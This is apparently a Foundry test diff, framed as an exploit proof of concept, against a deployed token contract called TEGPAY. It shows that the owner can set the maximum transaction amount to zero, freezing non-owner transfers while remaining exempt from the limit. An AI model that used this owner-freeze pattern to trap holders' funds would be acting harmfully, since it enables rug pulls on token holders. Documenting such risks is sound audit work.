@@ -1,0 +1,50 @@
+```solidity
+pragma solidity ^0.8.4;
+
+import "forge-std/Test.sol";
+
+interface ITEGPAY {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function setMaxTxPercent(uint256 maxTxPercent) external;
+    function _maxTxAmount() external view returns (uint256);
+    function isExcludedFromFee(address account) external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    ITEGPAY public constant tegpay = ITEGPAY(0xc35B753d5F2e86cae7C42f755eb1812855aB10c0);
+    address public constant OWNER = 0xBd51b6D98574327734C1621A7283778c5e6Af86e;
+    address public constant VICTIM = address(0xdead);
+
+    function setUp() public {
+        vm.label(address(tegpay), "TEGPAY");
+        vm.label(OWNER, "Owner");
+        vm.label(VICTIM, "Victim");
+    }
+
+    function testOwnerCanFreezeTransfers() public {
+        // Step 1: Owner transfers some tokens to the attacker (this contract)
+        uint256 transferAmount = 100 * 1e18;
+        vm.prank(OWNER);
+        tegpay.transfer(address(this), transferAmount);
+        assertEq(tegpay.balanceOf(address(this)), transferAmount, "Attacker should receive tokens");
+
+        // Step 2: Owner sets maxTxAmount to 0, effectively stopping all non-owner transfers
+        vm.prank(OWNER);
+        tegpay.setMaxTxPercent(0);
+        assertEq(tegpay._maxTxAmount(), 0, "Max tx amount should be zero");
+
+        // Step 3: Attacker (non-owner) tries to transfer to another non-owner -> should revert
+        uint256 smallAmount = 1 * 1e18;
+        vm.expectRevert("Transfer amount exceeds the maxTxAmount.");
+        tegpay.transfer(VICTIM, smallAmount);
+
+        // Step 4: Owner can still transfer (owner is exempt from the maxTx check)
+        uint256 ownerTransfer = 10 * 1e18;
+        vm.prank(OWNER);
+        tegpay.transfer(address(this), ownerTransfer);
+        assertEq(tegpay.balanceOf(address(this)), transferAmount + ownerTransfer, "Owner transfer should succeed");
+    }
+}
+```
